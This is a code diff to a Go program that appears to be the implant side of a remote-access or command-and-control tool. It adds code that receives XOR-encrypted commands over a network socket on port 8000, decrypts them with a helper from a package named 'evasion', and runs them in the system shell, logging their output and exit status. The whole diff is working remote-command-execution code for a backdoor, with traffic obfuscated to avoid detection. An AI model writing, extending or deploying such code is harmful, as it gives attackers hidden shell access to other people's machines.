@@ -1,13 +1,16 @@
 package main
 
 import (
+	"bufio"
 	"encoding/gob"
 	"errors"
 	"fmt"
 	"io"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
+	"sync"
 	"time"
 
 	"github.com/fatih/color"
@@ -21,7 +24,7 @@ import (
 const (
 	serverPort = "8000"
 
-	ExitSuccess int = 1
+	ExitSuccess int = 0
 )
 
 var (
@@ -122,13 +125,88 @@ func main() {
 			return
 		}
 
-		decryptedCommand := evasion.XorEncryptDecryptBytes(dataBuffer[:numBytes])
-
-		logger.Logf(logger.Debug, "Command is: '%s'\n", string(decryptedCommand))
-
 		// Shouldn't ever technically be greater than, but adding just in case
 		if numBytes >= len(dataBuffer) {
 			statusWarning.Println("Buffer is at maximum capacity, expect data to have been lost in transmission")
 		}
+
+		decryptedCommand := string(evasion.XorEncryptDecryptBytes(dataBuffer[:numBytes]))
+
+		logger.Logf(logger.Debug, "Command is: '%s'\n", string(decryptedCommand))
+
+		// Execute the command
+		shell, shellArgs := GetShellName()
+
+		outputc := make(chan []byte, 1024)
+		processc := make(chan *os.ProcessState, 1)
+		errc := make(chan error, 1)
+		timer := time.NewTimer(10 * time.Second)
+		go RunCommand(shell, shellArgs, decryptedCommand, outputc, processc, errc)
+
+		for {
+			select {
+			case output := <-outputc:
+				logger.Log(logger.Info, "Output is:")
+				fmt.Println(string(output))
+			case process := <-processc:
+				logger.Log(logger.Info, "Process information:")
+				fmt.Printf("Exit code | %d\nPID       | %d\nString    | %s\n", process.ExitCode(), process.Pid(), process.String())
+				break
+			case err = <-errc:
+				logger.Log(logger.Error, "ERROR WHEN EXECUTING COMMAND")
+				logger.LogError(err)
+				break
+			case timeout := <-timer.C:
+				logger.Log(logger.Warning, "Timed out after", timeout.String())
+				break
+			}
+
+			break
+		}
+
+		// Stop the timer, if still running
+		if !timer.Stop() {
+			<-timer.C
+		}
+
+		statusDone.Println("Done with connection! Everything worked!!!")
 	}
+}
+
+func RunCommand(shell, shellArgs, command string, outputc chan<- []byte, processc chan<- *os.ProcessState, errc chan<- error) {
+	cmd := exec.Command(shell, shellArgs, command)
+
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		errc <- err
+		return
+	}
+	cmd.Stderr = cmd.Stdout
+
+	scanner := bufio.NewScanner(stdout)
+	err = cmd.Start()
+	if err != nil {
+		errc <- err
+		return
+	}
+
+	var wg sync.WaitGroup
+	wg.Add(1)
+	go func() {
+		for scanner.Scan() {
+			outputc <- scanner.Bytes()
+		}
+		close(outputc)
+	}()
+	wg.Wait()
+
+	err = cmd.Wait()
+	if err != nil {
+		errc <- err
+		return
+	}
+	close(errc)
+
+	processc <- cmd.ProcessState
+	close(processc)
 }
